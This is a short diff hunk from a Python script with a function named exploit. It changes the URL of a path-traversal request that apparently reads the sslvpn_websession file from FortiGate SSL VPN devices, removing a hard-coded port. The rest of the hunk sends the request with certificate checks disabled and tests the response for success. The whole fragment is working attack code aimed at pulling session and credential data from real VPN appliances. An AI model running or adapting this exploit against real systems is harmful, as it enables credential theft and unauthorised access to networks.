@@ -28,7 +28,7 @@ def exploit(target):
 	target = target.strip()
 	print('[*] '+str(target)+' processing')
 	try:
-		url = 'https://'+str(target)+':10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
+		url = 'https://'+str(target)+'/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
 		req = urllib.request.urlopen(url, None, context=NOSSL, timeout=5)
 		result = req.read()
 		if req.code == int(200) and str('var fgt_lang =') in str(result):
